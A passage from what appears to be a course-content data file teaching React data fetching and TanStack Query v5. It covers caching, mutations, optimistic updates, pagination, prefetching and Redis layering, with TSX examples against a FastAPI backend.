        `Put all HTTP in one typed API client that checks <code>res.ok</code>, normalises FastAPI's <code>detail</code> into a readable message, throws an <code>ApiError</code> with <code>status</code>, and handles 204.`,
        `Every fetching effect gets a cleanup; prefer <code>AbortController</code> and pass <code>signal</code> all the way down to <code>fetch</code>.`,
        `Model request state as a discriminated union, and treat "aborted" as a non-event rather than an error.`,
        `Prefer same-origin (Vite proxy in dev, reverse proxy in prod) over CORS; if you must use CORS, list exact origins per environment and never combine wildcards with credentials.`,
        `Look at the Network waterfall for every new screen; start independent requests in parallel and as early as possible (route level, on intent).`,
        `Use Suspense/<code>use</code> only with promises from a cache, loader, framework or library; wrap Suspense boundaries in error boundaries with a retry action.`,
        `For anything beyond a toy, use TanStack Query or router loaders instead of hand-rolled effects.`
      ],
      lab: [
        `In your Vite app (with the Day 1 setup), start a small FastAPI app with <code>GET /api/users/{id}</code> that returns <code>{"id", "name", "email", "org_id"}</code>, raises <code>HTTPException(404)</code> for ids above 10, and does <code>await asyncio.sleep(random.uniform(0.1, 1.5))</code> to simulate variable latency.`,
        `Add the Vite proxy for <code>/api</code> → <code>http://localhost:8000</code>, create <code>src/lib/api.ts</code> and <code>src/api/users.ts</code> from the examples, and confirm <code>getUser(1)</code> works from the browser console via a temporary button.`,
        `Build <code>UserProfileBuggy</code> with Next/Previous buttons. Click Next rapidly five times and observe the name flicker and sometimes settle on the wrong user.`,
        `Replace it with the <code>AbortController</code> version. In the Network tab confirm older requests show "(canceled)". Navigate to id 11 and confirm the "No such user." message comes from the <code>ApiError</code> with status 404.`,
        `Add a <code>/api/users/{id}/posts</code> endpoint, build the waterfall and parallel versions, and compare total load time in the Network tab's waterfall column.`,
        `Bonus: build the <code>use(promise)</code> version with <code>Suspense</code> and the <code>ErrorBoundary</code>; stop the FastAPI server, click Next, and use "Try again" after restarting it.`,
        `<b>Done when:</b> rapid clicking always ends on the correct user, older requests appear as canceled in DevTools, a 404 renders a friendly message (not a crash or JSON), and the parallel profile loads in roughly max(latencies) rather than their sum.`
      ],
      teach: `<p>"React doesn't fetch data; it renders state. So fetching means: start a request, put loading, error or data into state, and make sure the result belongs to the current props. First trap: <code>fetch</code> doesn't reject on a 404 or 500, so I wrap it in one typed API client that checks <code>res.ok</code> and throws an <code>ApiError</code> with FastAPI's <code>detail</code> message.</p>
<p>Second trap: race conditions. If <code>userId</code> changes quickly, responses can arrive out of order and the old one overwrites the new one. The fix is the effect cleanup: create an <code>AbortController</code> per run, pass its signal to fetch, abort in the cleanup, and ignore aborted results. StrictMode's double effect in dev is just React checking that cleanup.</p>
<p>Third: waterfalls. If a child only starts fetching after its parent's data arrives, latencies add up. Start independent requests together, fetch at the route level, or add an aggregate endpoint. And CORS: the browser blocks cross-origin reads unless FastAPI allows the origin; I avoid it with the Vite proxy in dev and a reverse proxy in prod.</p>
<p>React 19's <code>use(promise)</code> lets a component suspend on data, with Suspense showing a fallback and an error boundary catching failures, but the promise must be cached outside render or it loops. Finally, raw effects have no caching, dedupe or retries, which is why real apps use TanStack Query or router loaders."</p>`
    },
    /* ------------------------------------------------------------------ */
    {
      id: "d7-tanstack-query",
      title: "TanStack Query: caching, mutations and optimistic updates",
      lv: ["mid", "senior", "lead", "architect"],
      eli5: `<p>Think of a good personal assistant who keeps a <b>notebook</b>. When you ask "what's on my calendar?", they don't phone the office every time. They look in the notebook, tell you immediately, and if the note is a bit old, they quietly phone the office in the background and update the page. That notebook is TanStack Query's <b>cache</b>, and each page is labelled with a <b>query key</b> like <code>["calendar", "2026-11-16"]</code>.</p>
<p>The assistant has two clocks for each page. One says how long the note counts as <b>fresh</b> ("calendar notes are good for 30 seconds; don't bother calling again before then"): that's <code>staleTime</code>. The other says how long to keep a page nobody is reading before tearing it out of the notebook: that's <code>gcTime</code>.</p>
<p>When you <i>change</i> something ("move my 3 pm meeting"), the assistant phones the office to make the change (a <b>mutation</b>) and then crosses out every notebook page that might now be wrong (<b>invalidation</b>), so they get re-checked. An eager assistant even updates the page in pencil <i>before</i> the office confirms (an <b>optimistic update</b>), and erases it if the office says no.</p>
<p>And the label matters: if the assistant files Alice's and Bob's calendars under the same label, they'll read Alice's calendar to Bob. Getting query keys right is most of the job.</p>`,
      what: `<p><b>TanStack Query</b> (formerly React Query) is a <b>server-state</b> library: an in-memory cache of data owned by your backend, plus the logic to fetch, dedupe, refresh, retry, paginate and update it. It is not a general state manager (Day 6 drew the line between client state and server state) and it does not do HTTP itself: you give it a <code>queryFn</code> that returns a promise, typically one of your typed API functions. This course uses <b>v5</b> only (<code>npm install @tanstack/react-query</code>); v4-era names like <code>cacheTime</code>, <code>isLoading</code>-for-first-load and <code>keepPreviousData: true</code> are gone or changed.</p>
<h5>1. Setup: <code>QueryClient</code> and <code>QueryClientProvider</code></h5>
<p>A <code>QueryClient</code> owns the <b>QueryCache</b> (all queries) and the <b>MutationCache</b>. Create it <b>once</b>, outside components (or in <code>useState</code> for SSR), and provide it with <code>&lt;QueryClientProvider client={queryClient}&gt;</code>. <code>defaultOptions</code> sets app-wide defaults such as <code>staleTime</code> and retry rules.</p>
<h5>2. <code>useQuery</code></h5>
<ul class="pts">
<li><b><code>queryKey</code></b>: an array that uniquely identifies the data, e.g. <code>["users", userId]</code> or <code>["todos", "list", { status: "open" }]</code>. It is hashed deterministically: object property order doesn't matter, array order does. <b>Everything the <code>queryFn</code> depends on must be in the key</b>; when the key changes, it's a different cache entry and a new fetch.</li>
<li><b><code>queryFn</code></b>: receives a context with <code>queryKey</code>, <code>signal</code> (an <code>AbortSignal</code>: pass it to <code>fetch</code> and Query cancels outdated requests for you), and <code>pageParam</code> for infinite queries. It must return a promise that resolves with data or <b>throws</b> on error (so your <code>res.ok</code> check matters).</li>
<li><b>Status flags</b>: <code>status</code> is <code>"pending" | "error" | "success"</code> (is there data?). <code>fetchStatus</code> is <code>"fetching" | "paused" | "idle"</code> (is a request running?). Derived booleans: <code>isPending</code> (no data yet), <code>isError</code>, <code>isSuccess</code>, <code>isFetching</code> (any request in flight, including background refetches), and <code>isLoading</code> = <code>isPending &amp;&amp; isFetching</code> (first load actually in progress). A disabled query with no data is <code>isPending</code> but not <code>isLoading</code>.</li>
<li><b>Deduplication</b>: ten components calling <code>useQuery</code> with the same key share one cache entry and one in-flight request.</li>
</ul>
<h5>3. Freshness and garbage collection: <code>staleTime</code> vs <code>gcTime</code></h5>
<ul class="pts">
<li><b><code>staleTime</code></b> (default <code>0</code>): how long data is considered fresh after it was fetched. Fresh data is served from cache with no request. Stale data is <i>still shown</i> from cache, but a background refetch happens on triggers: a new component mounting with that key (<code>refetchOnMount</code>), the window regaining focus (<code>refetchOnWindowFocus</code>), the network reconnecting (<code>refetchOnReconnect</code>), or an optional <code>refetchInterval</code>. This is <b>stale-while-revalidate</b>.</li>
<li><b><code>gcTime</code></b> (default 5 minutes; renamed from <code>cacheTime</code> in v5): how long a query with <b>no active observers</b> (no mounted component using it) stays in memory before being garbage collected. Navigate away and back within 5 minutes and the data shows instantly (and refetches in the background if stale).</li>
<li>They are independent: <code>staleTime</code> is about <i>when to refetch</i>, <code>gcTime</code> is about <i>when to forget</i>. <code>staleTime: Infinity</code> means "never stale automatically; only refetch when I invalidate".</li>
</ul>
<h5>4. Retries and errors</h5>
<p>Failed queries retry <b>3 times</b> by default on the client with exponential backoff (roughly 1 s, 2 s, 4 s, capped at 30 s), so an error state appears only after several seconds. Configure <code>retry</code> as a number, <code>false</code>, or a function <code>(failureCount, error) =&gt; boolean</code>; with a typed <code>ApiError</code> you can retry 5xx and network errors but not 4xx. While retrying, the previous error is in <code>failureReason</code>. In v5, the per-query <code>onSuccess</code>/<code>onError</code>/<code>onSettled</code> callbacks were removed from <code>useQuery</code>; handle global error reporting on the <code>QueryCache</code> (<code>new QueryCache({ onError })</code>) and render errors from <code>error</code>.</p>
<h5>5. Dependent and parallel queries</h5>
<ul class="pts">
<li><b>Dependent</b>: use <code>enabled: !!user</code> so the org query only runs once the user (and its <code>org_id</code>) is known; or, in recent v5 versions, pass <code>skipToken</code> as the <code>queryFn</code> when the input is missing, which is type-safe without a non-null assertion.</li>
<li><b>Parallel</b>: multiple <code>useQuery</code> calls in one component run in parallel automatically. For a dynamic number, use <code>useQueries({ queries: [...] , combine })</code>.</li>
</ul>
<h5>6. Mutations and invalidation</h5>
<p><code>useMutation({ mutationFn, onMutate, onSuccess, onError, onSettled })</code> returns <code>mutate</code> (fire and forget; errors go to callbacks) and <code>mutateAsync</code> (returns a promise you must catch), plus <code>isPending</code>, <code>isError</code>, <code>error</code>, <code>data</code>, <code>variables</code> and <code>reset</code>. Mutations don't touch the cache by themselves. After a successful write, you either <b>invalidate</b> (<code>queryClient.invalidateQueries({ queryKey: ["todos"] })</code> marks every query whose key <i>starts with</i> <code>["todos"]</code> as stale and refetches the active ones) or <b>write the response into the cache</b> with <code>setQueryData</code>. Returning the invalidation promise from <code>onSettled</code>/<code>onSuccess</code> keeps the mutation in its pending state until the refetch finishes, so the button spinner covers the whole operation.</p>
<h5>7. Optimistic updates</h5>
<p>Two styles in v5:</p>
<ul class="pts">
<li><b>Via the UI</b>: render <code>mutation.variables</code> as a pending item while <code>mutation.isPending</code>; nothing touches the cache, so there's nothing to roll back. Simple, and good when only one place shows the result.</li>
<li><b>Via the cache</b>: in <code>onMutate</code>, <code>await cancelQueries</code> (so an in-flight refetch can't overwrite your optimistic value), snapshot the current data with <code>getQueryData</code>, write the expected result with <code>setQueryData</code>, and return the snapshot. In <code>onError</code>, restore the snapshot from the returned context. In <code>onSettled</code>, invalidate to sync with the server's truth. The snapshot is your rollback.</li>
</ul>
<p>The value you return from <code>onMutate</code> is passed to <code>onError</code>, <code>onSuccess</code> and <code>onSettled</code> as their third argument. (Recent v5 minor versions also pass an additional context argument to these callbacks; the positional style shown here works across v5. Check the docs for your exact version.)</p>
<h5>8. Pagination and infinite queries</h5>
<ul class="pts">
<li><b>Page-numbered</b>: put the page in the key (<code>["posts", { page }]</code>) and use <code>placeholderData: keepPreviousData</code> so the old page stays visible (with <code>isPlaceholderData</code> true) while the next one loads, instead of flashing a spinner.</li>
<li><b>Infinite / cursor</b>: <code>useInfiniteQuery</code> with <code>initialPageParam</code> (required in v5) and <code>getNextPageParam(lastPage, allPages)</code> returning the next cursor, or <code>undefined</code>/<code>null</code> when there are no more pages. Data comes back as <code>{ pages, pageParams }</code>; you call <code>fetchNextPage()</code> and read <code>hasNextPage</code> and <code>isFetchingNextPage</code>. This maps directly onto a FastAPI endpoint returning <code>{ items, next_cursor }</code>. <code>maxPages</code> caps how many pages are kept in memory.</li>
</ul>
<h5>9. Prefetching</h5>
<p><code>queryClient.prefetchQuery(options)</code> fetches into the cache without a component (it doesn't return data or throw); <code>ensureQueryData</code> returns cached data or fetches it. Call them on hover or focus of a link, in a route loader (Day 8) so data loading starts in parallel with the route's code, or right after a mutation for the screen the user goes to next. When the component mounts, <code>useQuery</code> finds the data already there. This is the main waterfall killer.</p>
<h5>10. Query key factories and <code>queryOptions</code></h5>
<p>Hand-typed keys drift: <code>["todo", id]</code> in one file, <code>["todos", id]</code> in another, and invalidation silently misses. A <b>key factory</b> per feature (<code>todoKeys.all</code>, <code>todoKeys.list(filters)</code>, <code>todoKeys.detail(id)</code>) built hierarchically means <code>invalidateQueries({ queryKey: todoKeys.all })</code> reliably hits everything. v5's <code>queryOptions()</code> helper goes one step further: it bundles key + <code>queryFn</code> + options into one typed object you can pass to <code>useQuery</code>, <code>useSuspenseQuery</code>, <code>prefetchQuery</code> and <code>getQueryData</code>, and it ties the data type to the key so <code>getQueryData(todoQueries.detail(1).queryKey)</code> is typed.</p>
<h5>11. Devtools</h5>
<p><code>npm install @tanstack/react-query-devtools</code> and render <code>&lt;ReactQueryDevtools /&gt;</code> inside the provider. It lists every query with its key, status (fresh, fetching, stale, inactive), observers and data, and lets you refetch, invalidate, reset or simulate loading/error. By default it is only included in development builds. It's the fastest way to debug key mistakes.</p>
<h5>12. Two cache layers: TanStack Query and Redis</h5>
<p>In our stack, data can be cached twice, and they do different jobs:</p>
<ul class="pts">
<li><b>TanStack Query</b> lives in <b>one browser tab's memory</b>, per user. It removes network round trips, dedupes, gives instant back-navigation and drives UI states. It cannot help other users.</li>
<li><b>Redis</b> lives on the <b>server</b>, shared across all users and instances. It protects PostgreSQL from repeated expensive queries and keeps API latency low. It cannot save the client the network trip.</li>
<li>Staleness <b>adds up</b>: with a Redis TTL of 60 s and a <code>staleTime</code> of 30 s, a user may see data up to about 90 s old. And invalidation must happen at <b>both</b> layers: when FastAPI handles a write, it must delete or update the affected Redis keys; otherwise the client's <code>invalidateQueries</code> dutifully refetches... and gets the stale Redis value. Per-user data cached in Redis needs the user id in the Redis key, for the same reason query keys need the user id.</li>
</ul>`,
      why: `<p>The previous topic ended with a list of things hand-rolled effects don't do: cache, dedupe, retry, refetch on focus, cancel stale requests, coordinate with mutations, paginate, prefetch. Teams used to build these on top of Redux (with "loading/error/data" slices and thunks per endpoint), and the result was huge amounts of boilerplate and subtle bugs: lists not updating after creates, spinners on every navigation, the same endpoint called by five components, and normalised stores that were out of sync with the server.</p>
<p>TanStack Query's insight is that server state is fundamentally different from client state: you don't own it, it can change without you knowing, and your copy is always a <i>cache</i>. So the right abstraction is a cache with freshness rules and invalidation, not a store you mutate. Once that's in place, the Redux store shrinks to genuine client state (or disappears in favour of Zustand/context, Day 6), and components simply declare "I need <code>["users", id]</code>". For a FastAPI backend it's a natural fit: your typed API functions become <code>queryFn</code>s, HTTP verbs map to queries vs mutations, and FastAPI's cursor pagination maps onto <code>useInfiniteQuery</code>.</p>`,
      diagram: {
        html: lanes([
          ["Component", ["useQuery({ queryKey: ['users', 7] })", "renders cached data immediately", "re-renders when the query's state changes", "useMutation → mutate()"]],
          ["QueryClient (browser memory)", ["QueryCache: hash(['users',7]) → Query", "fresh? serve. stale? serve + background refetch", "dedupes in-flight requests; retries x3", "invalidateQueries → mark stale → refetch active", "no observers for gcTime → removed"]],
          ["FastAPI → Redis → PostgreSQL", ["GET /api/users/7", "Redis hit → return (TTL)", "Redis miss → SQL → set Redis", "PATCH → write Postgres → DEL Redis key"]]
        ]),
        steps: [
          `A component calls <code>useQuery</code> with a key. The <code>QueryClient</code> hashes the key and finds or creates a <b>Query</b> in the <code>QueryCache</code>; the component becomes an <b>observer</b> of it.`,
          `If there's no data, the query is <code>pending</code> and <code>queryFn</code> runs (once, however many observers there are). If data exists and is fresh (younger than <code>staleTime</code>), it's returned with no request.`,
          `If data exists but is stale, it's returned immediately <b>and</b> a background refetch starts (on mount, window focus, reconnect). <code>isFetching</code> is true; <code>isPending</code> stays false.`,
          `The request reaches FastAPI, which serves from Redis or falls through to PostgreSQL and populates Redis. The response replaces the cached data and all observers re-render.`,
          `A mutation writes via FastAPI (which updates Postgres and deletes the stale Redis key), then <code>invalidateQueries</code> marks matching queries stale and refetches the active ones. Unobserved queries are garbage-collected after <code>gcTime</code>.`
        ]
      },
      ex: [
        {
          t: "Setup: QueryClient, defaults, retry rules and Devtools (src/main.tsx)",
          lang: "tsx",
          code: `// npm install @tanstack/react-query @tanstack/react-query-devtools
import { StrictMode } from "react";
import { createRoot } from "react-dom/client";
import { QueryCache, QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { ReactQueryDevtools } from "@tanstack/react-query-devtools";
import { ApiError } from "./lib/api";
import App from "./App";

const queryClient = new QueryClient({
  queryCache: new QueryCache({
    // one place for error reporting (per-query onError was removed in v5)
    onError: (error, query) => {
      console.error("Query failed", query.queryKey, error); // Sentry in prod
    },
  }),
  defaultOptions: {
    queries: {
      staleTime: 30_000, // fresh for 30 s: no refetch on every mount/focus
      retry: (failureCount, error) => {
        // don't retry 4xx (bad id, unauthorised, validation): they won't change
        if (error instanceof ApiError && error.status < 500) return false;
        return failureCount < 3;
      },
    },
  },
});

createRoot(document.getElementById("root")!).render(
  <StrictMode>
    <QueryClientProvider client={queryClient}>
      <App />
      <ReactQueryDevtools initialIsOpen={false} />
    </QueryClientProvider>
  </StrictMode>,
);`,
          note: `<p>The client is created at module level, once. Creating it inside <code>App</code>'s body would make a new, empty cache on every render. Raising the default <code>staleTime</code> above 0 is one of the most common production tweaks: with 0, every mount and every tab focus triggers a refetch. The Devtools component is excluded from production bundles by default.</p>`
        },
        {
          t: "Your first useQuery: the effect-based profile, rewritten",
          lang: "tsx",
          code: `import { useQuery } from "@tanstack/react-query";
import { ApiError } from "./lib/api";
import { getUser } from "./api/users";

export function UserProfile({ userId }: { userId: number }) {
  const { data, error, isPending, isError, isFetching } = useQuery({
    queryKey: ["users", userId], // everything queryFn uses is in the key
    queryFn: ({ signal }) => getUser(userId, signal), // signal: auto-cancel
  });

  if (isPending) return <p>Loading user...</p>;
  if (isError) {
    const notFound = error instanceof ApiError && error.status === 404;
    return <p role="alert">{notFound ? "No such user." : error.message}</p>;
  }

  // TypeScript knows data is User here
  return (
    <article>
      <h2>
        {data.name} {isFetching && <small>(refreshing...)</small>}
      </h2>
      <p>{data.email}</p>
    </article>
  );
}`,
          out: `First visit to user 7:        isPending=true -> data shown
Switch to 8, then back to 7:   user 7 shows instantly from cache (no spinner)
Alt-tab away and back (stale): data stays visible, isFetching=true briefly`,
          note: `<p>No <code>useState</code>, no <code>useEffect</code>, no cleanup, and no race condition: each <code>userId</code> is its own cache entry, so a late response for user 7 is written to <code>["users", 7]</code> and can never appear under user 8. Branching on <code>isPending</code>/<code>isError</code> first narrows <code>data</code> to <code>User</code>. Show a subtle indicator for background refetches (<code>isFetching</code>) rather than a full spinner.</p>`
        },
        {
          t: "Query key factory + queryOptions (src/features/todos/queries.ts)",
          lang: "ts",
          code: `import { queryOptions } from "@tanstack/react-query";
import { api } from "../../lib/api";

export type Todo = { id: number; title: string; done: boolean; owner_id: number };
export type TodoFilters = { status: "all" | "open" | "done"; q: string };

// Hierarchical keys: invalidating a prefix hits everything below it.
export const todoKeys = {
  all: ["todos"] as const,
  lists: () => [...todoKeys.all, "list"] as const,
  list: (filters: TodoFilters) => [...todoKeys.lists(), filters] as const,
  details: () => [...todoKeys.all, "detail"] as const,
  detail: (id: number) => [...todoKeys.details(), id] as const,
};

export const todoQueries = {
  list: (filters: TodoFilters) =>
    queryOptions({
      queryKey: todoKeys.list(filters),
      queryFn: ({ signal }) =>
        api<Todo[]>(\`/api/todos?\${new URLSearchParams(filters)}\`, { signal }),
    }),
  detail: (id: number) =>
    queryOptions({
      queryKey: todoKeys.detail(id),
      queryFn: ({ signal }) => api<Todo>(\`/api/todos/\${id}\`, { signal }),
      staleTime: 60_000,
    }),
};

// Usage anywhere, fully typed:
//   useQuery(todoQueries.list({ status: "open", q: "" }))
//   queryClient.prefetchQuery(todoQueries.detail(5))
//   queryClient.getQueryData(todoQueries.detail(5).queryKey)  // Todo | undefined
//   queryClient.invalidateQueries({ queryKey: todoKeys.lists() })`,
          note: `<p>Keys look like <code>["todos","list",{status:"open",q:""}]</code> and <code>["todos","detail",5]</code>. Because matching is by prefix, <code>todoKeys.lists()</code> invalidates every filtered list but not the details, and <code>todoKeys.all</code> hits both. If your backend serves per-user data and your app can switch users without a reload, include the user id at the top of the hierarchy or clear the cache on logout (<code>queryClient.clear()</code>).</p>`
        },
        {
          t: "Dependent and parallel queries",
          lang: "tsx",
          code: `import { skipToken, useQueries, useQuery } from "@tanstack/react-query";
import { api } from "./lib/api";
import { getUser } from "./api/users";
import { todoQueries } from "./features/todos/queries";

type Org = { id: number; name: string; plan: "free" | "pro" };

export function UserWithOrg({ userId }: { userId: number }) {
  const userQuery = useQuery({
    queryKey: ["users", userId],
    queryFn: ({ signal }) => getUser(userId, signal),
  });
  const orgId = userQuery.data?.org_id;

  // Dependent: runs only once orgId is known. Option A: enabled
  const orgQuery = useQuery({
    queryKey: ["orgs", orgId],
    queryFn: ({ signal }) => api<Org>(\`/api/orgs/\${orgId}\`, { signal }),
    enabled: orgId !== undefined,
  });

  // Option B (recent v5): skipToken, no 'enabled' and no undefined in the URL
  const orgQueryB = useQuery({
    queryKey: ["orgs", orgId],
    queryFn:
      orgId !== undefined
        ? ({ signal }) => api<Org>(\`/api/orgs/\${orgId}\`, { signal })
        : skipToken,
  });

  if (userQuery.isPending) return <p>Loading...</p>;
  if (userQuery.isError) return <p role="alert">{userQuery.error.message}</p>;
  return (
    <p>
      {userQuery.data.name} @ {orgQuery.data?.name ?? orgQueryB.data?.name ?? "..."}
    </p>
  );
}

// Parallel, dynamic count: one query per id, all in flight at once.
export function PinnedTodos({ ids }: { ids: number[] }) {
  const { todos, pending } = useQueries({
    queries: ids.map((id) => todoQueries.detail(id)),
    combine: (results) => ({
      todos: results.flatMap((r) => (r.data ? [r.data] : [])),
      pending: results.some((r) => r.isPending),
    }),
  });
  return (
    <ul aria-busy={pending}>
      {todos.map((t) => (
        <li key={t.id}>{t.title}</li>
      ))}
    </ul>
  );
}`,
          note: `<p>Both org queries share the key <code>["orgs", orgId]</code>, so in this demo they're deduplicated into one cache entry; in real code pick one style. The user→org dependency is real (we need <code>org_id</code>), so it's an acceptable sequential step; everything independent should be parallel. <code>combine</code> lets you derive a single value from many results; its result is structurally shared so it doesn't cause extra re-renders when nothing changed.</p>`
        },
        {
          t: "useMutation with invalidation",
          lang: "tsx",
          code: `import { useState, type FormEvent } from "react";
import { useMutation, useQueryClient } from "@tanstack/react-query";
import { api } from "./lib/api";
import { todoKeys, type Todo } from "./features/todos/queries";

export function AddTodo() {
  const queryClient = useQueryClient();
  const [title, setTitle] = useState("");

  const addTodo = useMutation({
    mutationFn: (newTitle: string) =>
      api<Todo>("/api/todos", { method: "POST", body: JSON.stringify({ title: newTitle }) }),
    onSuccess: (created) => {
      // seed the detail cache with the server's response (no extra GET)
      queryClient.setQueryData(todoKeys.detail(created.id), created);
      setTitle("");
      // return the promise: mutation stays pending until lists have refetched
      return queryClient.invalidateQueries({ queryKey: todoKeys.lists() });
    },
  });

  function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();
    if (title.trim()) addTodo.mutate(title.trim());
  }

  return (
    <form onSubmit={handleSubmit}>
      <input value={title} onChange={(e) => setTitle(e.target.value)} aria-label="New todo" />
      <button disabled={addTodo.isPending}>{addTodo.isPending ? "Adding..." : "Add"}</button>
      {addTodo.isError && <p role="alert">{addTodo.error.message}</p>}
    </form>
  );
}`,
          out: `Network after clicking Add:
  POST /api/todos                201
  GET  /api/todos?status=all&q=  200   (active list refetched by invalidation)
Inactive lists (e.g. status=done, not on screen) are only marked stale;
they refetch when next shown.`,
          note: `<p>Without the <code>invalidateQueries</code> call, the POST succeeds but the list keeps showing cached data until it goes stale and something triggers a refetch: the classic "I added it but it's not there" bug. In v5, <code>invalidateQueries</code> only accepts the object form (<code>{ queryKey }</code>). The 422 from FastAPI's validation lands in <code>addTodo.error</code> with the message our API client extracted from <code>detail</code>.</p>`
        },
        {
          t: "Optimistic update with rollback (toggle done)",
          lang: "tsx",
          code: `import { useMutation, useQueryClient } from "@tanstack/react-query";
import { api } from "./lib/api";
import { todoKeys, type Todo, type TodoFilters } from "./features/todos/queries";

export function useToggleTodo(filters: TodoFilters) {
  const queryClient = useQueryClient();
  const listKey = todoKeys.list(filters);

  return useMutation({
    mutationFn: (vars: { id: number; done: boolean }) =>
      api<Todo>(\`/api/todos/\${vars.id}\`, {
        method: "PATCH",
        body: JSON.stringify({ done: vars.done }),
      }),

    onMutate: async (vars) => {
      // 1. stop in-flight refetches from overwriting our optimistic value
      await queryClient.cancelQueries({ queryKey: listKey });
      // 2. snapshot for rollback
      const previous = queryClient.getQueryData<Todo[]>(listKey);
      // 3. optimistic write (immutably)
      queryClient.setQueryData<Todo[]>(listKey, (old) =>
        old?.map((t) => (t.id === vars.id ? { ...t, done: vars.done } : t)),
      );
      // 4. returned value becomes the "context" for onError/onSettled
      return { previous };
    },

    onError: (_err, _vars, context) => {
      if (context?.previous) queryClient.setQueryData(listKey, context.previous);
    },

    onSettled: () =>
      // 5. always re-sync with the server's truth (success or failure)
      queryClient.invalidateQueries({ queryKey: todoKeys.lists() }),
  });
}

// In a component:
// const toggle = useToggleTodo(filters);
// <input type="checkbox" checked={todo.done}
//        onChange={(e) => toggle.mutate({ id: todo.id, done: e.target.checked })} />`,
          out: `Click checkbox: ticks instantly (optimistic)
FastAPI returns 500: checkbox unticks (rollback), error available on toggle.error
FastAPI returns 200: lists refetched; value confirmed`,
          note: `<p>Each step has a reason. Skip <code>cancelQueries</code> and a background refetch that started before the click can land after your optimistic write and briefly revert it. Skip the snapshot and you can't roll back. Skip <code>onSettled</code> invalidation and other lists (e.g. the "done" filter) never learn about the change. For a todo shown in several lists you can snapshot all of them with <code>getQueriesData</code>/<code>setQueriesData</code>. If only this screen shows the change, the simpler v5 approach is to render <code>mutation.variables</code> while <code>isPending</code> and skip cache surgery.</p>`
        },
        {
          t: "Page-numbered pagination without flashing (keepPreviousData)",
          lang: "tsx",
          code: `import { useState } from "react";
import { keepPreviousData, useQuery } from "@tanstack/react-query";
import { api } from "./lib/api";

type Page<T> = { items: T[]; page: number; pages: number };
type Order = { id: number; total: number };

export function OrdersTable() {
  const [page, setPage] = useState(1);
  const { data, isPending, isError, error, isPlaceholderData, isFetching } = useQuery({
    queryKey: ["orders", { page }],
    queryFn: ({ signal }) => api<Page<Order>>(\`/api/orders?page=\${page}&size=20\`, { signal }),
    placeholderData: keepPreviousData, // show page N while N+1 loads
  });

  if (isPending) return <p>Loading orders...</p>;
  if (isError) return <p role="alert">{error.message}</p>;

  return (
    <>
      <table style={{ opacity: isPlaceholderData ? 0.5 : 1 }}>
        <tbody>
          {data.items.map((o) => (
            <tr key={o.id}><td>#{o.id}</td><td>{o.total}</td></tr>
          ))}
        </tbody>
      </table>
      <button onClick={() => setPage((p) => p - 1)} disabled={page === 1}>Prev</button>
      <span> Page {data.page} of {data.pages} {isFetching && "..."} </span>
      <button
        onClick={() => setPage((p) => p + 1)}
        disabled={isPlaceholderData || page >= data.pages}
      >
        Next
      </button>
    </>
  );
}`,
          note: `<p>v5 replaced the old <code>keepPreviousData: true</code> option with <code>placeholderData: keepPreviousData</code> (an imported helper). Each page is its own cache entry, so going back to page 1 is instant. Disabling Next while <code>isPlaceholderData</code> prevents skipping pages before the current one has loaded.</p>`
        },
        {
          t: "Infinite scrolling against FastAPI cursor pagination",
          lang: "tsx",
          code: `import { useInfiniteQuery } from "@tanstack/react-query";
import { api } from "./lib/api";

type Post = { id: number; title: string };
// FastAPI: GET /api/posts?limit=20&cursor=... -> {"items": [...], "next_cursor": "abc" | null}
type PostPage = { items: Post[]; next_cursor: string | null };

export function Feed() {
  const {
    data, error, isPending, isError,
    fetchNextPage, hasNextPage, isFetchingNextPage,
  } = useInfiniteQuery({
    queryKey: ["posts", "feed"],
    queryFn: ({ pageParam, signal }) => {
      const params = new URLSearchParams({ limit: "20" });
      if (pageParam) params.set("cursor", pageParam);
      return api<PostPage>(\`/api/posts?\${params}\`, { signal });
    },
    initialPageParam: null as string | null, // required in v5
    getNextPageParam: (lastPage) => lastPage.next_cursor, // null => no more pages
    maxPages: 10, // optional: keep memory bounded on long sessions
  });

  if (isPending) return <p>Loading feed...</p>;
  if (isError) return <p role="alert">{error.message}</p>;

  return (
    <>
      <ul>
        {data.pages.flatMap((page) => page.items).map((post) => (
          <li key={post.id}>{post.title}</li>
        ))}
      </ul>
      <button onClick={() => fetchNextPage()} disabled={!hasNextPage || isFetchingNextPage}>
        {isFetchingNextPage ? "Loading more..." : hasNextPage ? "Load more" : "No more posts"}
      </button>
    </>
  );
}`,
          note: `<p>Cursor pagination (keyset: <code>WHERE id &lt; :cursor ORDER BY id DESC LIMIT 20</code> in PostgreSQL) is stable when new posts are inserted, unlike offset pagination, which shifts and duplicates rows. Replace the button with an <code>IntersectionObserver</code> sentinel for true infinite scroll, and virtualise long lists (Day 11). When an infinite query refetches (focus, invalidation), v5 refetches its pages sequentially starting from the first, so a very long list means many requests; <code>maxPages</code> bounds that. If you use <code>maxPages</code> and need to scroll back up, you also need <code>getPreviousPageParam</code>.</p>`
        },
        {
          t: "Prefetching on intent and in a route loader",
          lang: "tsx",
          code: `import { Link } from "react-router";
import { useQueryClient, type QueryClient } from "@tanstack/react-query";
import { todoQueries, type Todo } from "./features/todos/queries";

// 1) On hover/focus: data is often in cache before the click lands.
export function TodoLink({ todo }: { todo: Todo }) {
  const queryClient = useQueryClient();
  const prefetch = () => {
    void queryClient.prefetchQuery(todoQueries.detail(todo.id)); // respects staleTime
  };
  return (
    <Link to={\`/todos/\${todo.id}\`} onMouseEnter={prefetch} onFocus={prefetch}>
      {todo.title}
    </Link>
  );
}

// 2) In a React Router loader (Day 8): start fetching in parallel with
//    the route's code, before the component renders.
export const todoLoader =
  (queryClient: QueryClient) =>
  async ({ params }: { params: { id?: string } }) => {
    const id = Number(params.id);
    await queryClient.ensureQueryData(todoQueries.detail(id)); // cached or fetch
    return null; // the component reads it with useQuery(todoQueries.detail(id))
  };`,
          note: `<p><code>prefetchQuery</code> never throws and returns nothing; if the data is fresh it does nothing. <code>ensureQueryData</code> returns cached data if present, otherwise fetches (and throws on error, which a router's error element can catch). Because both use the same <code>queryOptions</code> object as the component, the keys can't drift. Wiring loaders into routes is covered on Day 8.</p>`
        },
        {
          t: "Suspense mode: useSuspenseQuery with an error boundary",
          lang: "tsx",
          code: `import { Suspense } from "react";
import { QueryErrorResetBoundary, useSuspenseQuery } from "@tanstack/react-query";
import { ErrorBoundary } from "react-error-boundary"; // npm install react-error-boundary
import { todoQueries } from "./features/todos/queries";

function TodoDetail({ id }: { id: number }) {
  const { data } = useSuspenseQuery(todoQueries.detail(id)); // data is always defined
  return <h2>{data.title}</h2>;
}

export function TodoPage({ id }: { id: number }) {
  return (
